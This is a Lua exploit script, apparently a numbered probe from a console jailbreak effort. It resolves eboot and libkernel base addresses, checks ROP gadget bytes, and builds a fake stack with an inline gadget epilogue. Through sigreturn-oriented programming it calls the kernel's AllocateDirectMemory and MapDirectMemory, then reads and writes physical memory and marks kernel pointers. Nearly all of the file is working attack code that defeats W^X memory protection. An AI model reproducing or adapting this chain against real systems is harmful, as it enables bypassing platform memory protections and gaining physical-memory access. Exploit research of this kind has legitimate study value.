-- CRASH_CLASS: MODERATE
-- PROBE 528g: MapDirectMemory via main-thread SROP with inline epilogue
--
-- 528f/528f2 FAILED because epilogue was at a heap address (not executable).
-- When the function does "ret", it pops [RSP+0] as RIP. That address MUST be
-- in executable memory (eboot). Heap pointers → crash (W^X).
--
-- Fix: epilogue gadgets are inline on the fake stack. Every [fn_rsp+N] value
-- is either a gadget ADDRESS (in eboot, executable) or a DATA value consumed
-- by a pop instruction. The execution flow after "ret" walks the stack.
--
-- Stack layout for 7-arg function:
--   [fn_rsp + 0x00] = pop_rdi addr    ← function's ret pops this
--   [fn_rsp + 0x08] = NULL (7th arg)  ← function reads as arg7; pop_rdi sets rdi=0
--   [fn_rsp + 0x10] = pop_rdi addr    ← second pop_rdi
--   [fn_rsp + 0x18] = &result_buf     ← pop_rdi sets rdi=&result_buf
--   [fn_rsp + 0x20] = mov_m addr      ← mov [rdi], rax; ret → stores rv
--   [fn_rsp + 0x28] = pop_rax addr
--   [fn_rsp + 0x30] = 417             ← sigreturn number
--   [fn_rsp + 0x38] = pop_rdi addr
--   [fn_rsp + 0x40] = &restore_ctx
--   [fn_rsp + 0x48] = stub addr       ← syscall; ret → sigreturn

print("=== PROBE 528g: MAP DIRECT MEMORY (inline epilogue) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Ignore signals
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

-- Eboot
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local function eaddr(off) return eboot + uint64(off) end
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Libkernel
local ib2 = memory.alloc(0x200)
wd(N(ib2), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib2) end)
local lk_lo = rd(N(ib2) + 0x108) or 0
local lk_hi = rd(N(ib2) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
if lk_lo == 0 and lk_hi == 0 then
    for h = 0, 0x100 do
        local ib3 = memory.alloc(0x200)
        wd(N(ib3), 0x160)
        local ok3, r3 = pcall(function() return mk(593)(uint64(h), ib3) end)
        if ok3 and N(r3) == 0 then
            local name = ""
            for i = 0, 31 do
                local b = rd(N(ib3) + 8 + i)
                if b then local c = b % 256; if c == 0 then break end
                    if c >= 32 and c < 127 then name = name .. string.char(c) end
                end
            end
            if name:find("libkernel") then
                lk_lo = rd(N(ib3) + 0x108) or 0
                lk_hi = rd(N(ib3) + 0x10C) or 0
                if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
                if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
                break
            end
        end
    end
end
if lk_lo == 0 and lk_hi == 0 then print("FAIL: libkernel"); return end
local lk_text = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local alloc_fn = lk_text + uint64(0x17EF0)
local map_fn   = lk_text + uint64(0x15020)
print("libkernel=" .. fmt(lk_text))

-- Gadgets
local G = {
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    pop_rdx  = 0x3B02D7,
    pop_rcx  = 0xE64,
    mov_m    = 0x92C67,
    bare_ret = 0x42,
}
local function vg(off, expect, nb)
    local d = rd(N(eboot) + off)
    if d == nil then return false end
    if d < 0 then d = d + 0x100000000 end
    local mask = 0
    for i = 0, nb - 1 do mask = mask + 0xFF * (2 ^ (i * 8)) end
    return (d % (mask + 1)) == expect
end
if not vg(G.pop_rax, 0xC358, 2) then print("GADGET FAIL"); return end
if not vg(G.pop_rdi, 0xC35F, 2) then
    G.pop_rdi = 0x75DFE
    if not vg(G.pop_rdi, 0xC35F, 2) then print("GADGET FAIL"); return end
end
if not vg(G.mov_m, 0xC3078948, 4) then print("GADGET FAIL"); return end
print("gadgets OK")

local MC = 0x40
local sc_gc = mk(421)
local sc_sr = mk(417)

-- ============================================================
-- [A] AllocateDirectMemory via fcall
-- ============================================================
print("")
print("[A] AllocateDirectMemory via fcall")
local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))
local ok_a, rv_a = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)
if not ok_a or N(rv_a) ~= 0 then print("  FAILED"); return end
local phys_addr = rq(N(phys_out))
print("  phys=" .. fmt(phys_addr))
print("  OK")

-- ============================================================
-- [A2] AllocateDirectMemory via SROP (same inline pattern as B)
-- Control test: if this works but B dies, MapDM is the culprit.
-- ============================================================
print("")
print("[A2] AllocateDirectMemory via SROP (inline epilogue)")
do
    local sc_mmap_a2 = mk(477)
    local result_a2 = memory.alloc(8)
    wq(N(result_a2), uint64("0xDEADDEADDEADDEAD"))
    local phys_a2 = memory.alloc(8)
    wq(N(phys_a2), uint64(0))

    local restore_a2 = memory.alloc(0x500)
    pcall(function() return sc_gc(uint64(restore_a2)) end)

    local fs_a2 = sc_mmap_a2(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if not fs_a2 or N(fs_a2) == 0 then print("  mmap FAIL"); return end
    local fn_rsp_a2 = N(fs_a2) + 0x100000 + 8

    local p2 = fn_rsp_a2
    local function stk2(v) wq(p2, v); p2 = p2 + 8 end
    stk2(eaddr(G.pop_rdi))         -- ret addr
    stk2(uint64(0))                -- junk consumed by pop_rdi
    stk2(eaddr(G.pop_rdi))
    stk2(uint64(N(result_a2)))
    stk2(eaddr(G.mov_m))
    stk2(eaddr(G.pop_rax))
    stk2(uint64(417))
    stk2(eaddr(G.pop_rdi))
    stk2(uint64(N(restore_a2)))
    stk2(stub)

    local cc_a2 = memory.alloc(0x500)
    pcall(function() return sc_gc(uint64(cc_a2)) end)
    wq(N(cc_a2) + MC + 0xA0, alloc_fn)
    wq(N(cc_a2) + MC + 0xB8, uint64(fn_rsp_a2))
    wq(N(cc_a2) + MC + 0x48, uint64(fn_rsp_a2 - 8))
    wq(N(cc_a2) + MC + 0x08, uint64(0))               -- rdi = searchStart
    wq(N(cc_a2) + MC + 0x10, uint64("0x150000000"))    -- rsi = searchEnd
    wq(N(cc_a2) + MC + 0x18, uint64(0x4000))           -- rdx = len
    wq(N(cc_a2) + MC + 0x50, uint64(0x4000))           -- rcx = align
    wq(N(cc_a2) + MC + 0x28, uint64(0))                -- r8 = memType
    wq(N(cc_a2) + MC + 0x30, uint64(N(phys_a2)))       -- r9 = &physOut

    print("  firing...")
    pcall(function() return sc_sr(uint64(cc_a2)) end)

    if not alive() then print("  KILLED — pattern itself is broken!"); return end
    local rv_a2 = rq(N(result_a2))
    local pa2 = rq(N(phys_a2))
    print("  rv=" .. fmt(rv_a2) .. " phys=" .. fmt(pa2))
    if rv_a2 and N(rv_a2) == 0 then
        print("  *** SROP inline pattern WORKS for AllocateDirectMemory ***")
    else
        print("  SROP pattern FAILED even for AllocateDirectMemory!")
        return
    end
end

if not alive() then print("DIED after A2"); return end

-- ============================================================
-- [B] MapDirectMemory via main-thread SROP (inline epilogue)
-- ============================================================
print("")
print("[B] MapDirectMemory via main-thread SROP")

local virt_out = memory.alloc(8)
local map_ok = false
local mapped_va = nil

local sc_mmap = mk(477)
local flag_list = {0, 1, 2, 0x10, 0x12, 0x100, 0x412}

for fi, flags in ipairs(flag_list) do
    if not alive() then print("  DIED"); return end
    wq(N(virt_out), uint64(0))

    local result_buf = memory.alloc(8)
    wq(N(result_buf), uint64("0xDEADDEADDEADDEAD"))

    -- Capture restore point
    local restore_ctx = memory.alloc(0x500)
    pcall(function() return sc_gc(uint64(restore_ctx)) end)

    -- Fake stack: use a LARGE mmap buffer (2 MiB).
    -- fn_rsp in the MIDDLE so the function has room to grow downward.
    -- C functions do push/sub rsp — they need stack space BELOW RSP.
    local fstack_raw = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if not fstack_raw or N(fstack_raw) == 0 then
        print("  mmap for fake stack FAILED"); return
    end
    -- Put fn_rsp at 1 MiB into the buffer (plenty of room below AND above)
    -- fn_rsp ≡ 8 (mod 16) for post-call alignment
    local fn_rsp = N(fstack_raw) + 0x100000 + 8

    -- Write inline epilogue on the fake stack
    -- When MapDirectMemory does "ret": pops [fn_rsp] → RIP
    -- Then RSP = fn_rsp + 8. Stack walk continues from fn_rsp + 8.
    local p = fn_rsp
    local function stk(v) wq(p, v); p = p + 8 end

    stk(eaddr(G.pop_rdi))         -- [+0x00] function's ret addr → pop rdi; ret
    stk(uint64(0))                -- [+0x08] 7th arg (name=NULL) / pop_rdi consumes → rdi=0
    stk(eaddr(G.pop_rdi))         -- [+0x10] second pop_rdi
    stk(uint64(N(result_buf)))    -- [+0x18] → rdi = &result_buf
    stk(eaddr(G.mov_m))           -- [+0x20] mov [rdi], rax; ret → stores rv
    stk(eaddr(G.pop_rax))         -- [+0x28]
    stk(uint64(417))              -- [+0x30] rax = sigreturn
    stk(eaddr(G.pop_rdi))         -- [+0x38]
    stk(uint64(N(restore_ctx)))   -- [+0x40] rdi = &restore_ctx
    stk(stub)                     -- [+0x48] syscall; ret → sigreturn

    -- Call context
    local call_ctx = memory.alloc(0x500)
    pcall(function() return sc_gc(uint64(call_ctx)) end)

    wq(N(call_ctx) + MC + 0xA0, map_fn)              -- rip = MapDirectMemory
    wq(N(call_ctx) + MC + 0xB8, uint64(fn_rsp))      -- rsp
    wq(N(call_ctx) + MC + 0x48, uint64(fn_rsp - 8))  -- rbp (just below RSP)
    wq(N(call_ctx) + MC + 0x08, uint64(N(virt_out)))  -- rdi = &virtOut
    wq(N(call_ctx) + MC + 0x10, uint64(0x4000))       -- rsi = len
    wq(N(call_ctx) + MC + 0x18, uint64(3))            -- rdx = PROT_RW
    wq(N(call_ctx) + MC + 0x50, uint64(flags))        -- rcx = flags
    wq(N(call_ctx) + MC + 0x28, phys_addr)            -- r8 = physAddr
    wq(N(call_ctx) + MC + 0x30, uint64(0x4000))       -- r9 = alignment

    print(string.format("  [%d] flags=0x%X", fi, flags))
    local ok_sr, rv_sr = pcall(function() return sc_sr(uint64(call_ctx)) end)

    if not alive() then
        print(string.format("  flags=0x%X: KILLED", flags)); return
    end

    local rv = rq(N(result_buf))
    local va = rq(N(virt_out))
    local rv_n = rv and N(rv) or -999
    print(string.format("  rv=%d va=%s", rv_n, fmt(va)))

    if rv_n == 0 and va then
        local vah, val_ = get_hi_lo(va)
        if vah < 0 then vah = vah + 0x100000000 end
        if val_ < 0 then val_ = val_ + 0x100000000 end
        if vah ~= 0 or val_ > 0x1000 then
            print("  *** MAPPING SUCCESS! ***")
            map_ok = true
            mapped_va = va
            break
        end
    end
end

-- ============================================================
-- [C] Read/write physical memory
-- ============================================================
if map_ok and mapped_va then
    print("")
    print("[C] PHYSICAL MEMORY")
    print("  VA=" .. fmt(mapped_va))

    for i = 0, 15 do
        local v = rq(N(mapped_va) + i * 8)
        if v then
            local line = string.format("  [+0x%02X] = %s", i * 8, fmt(v))
            local vh, vl = get_hi_lo(v)
            if vh < 0 then vh = vh + 0x100000000 end
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                local exp = math.floor(vh / 0x100000) % 0x800
                if exp ~= 0x7FF then
                    line = line .. " *** KPTR ***"
                end
            end
            print(line)
        end
    end

    wd(N(mapped_va), 0xCAFEBABE)
    local rb = rd(N(mapped_va))
    if rb then
        if rb < 0 then rb = rb + 0x100000000 end
    end
    print(string.format("  write_test: 0x%X %s", rb or 0,
        (rb == 0xCAFEBABE) and "MATCH" or "MISMATCH"))
end

-- Summary
print("")
if map_ok then
    print("*** PHYSICAL MEMORY R/W ***")
    print("  phys=" .. fmt(phys_addr))
    print("  va=" .. fmt(mapped_va))
else
    print("MAP FAILED")
end
print("alive=" .. tostring(alive()))
print("=== 528g COMPLETE ===")
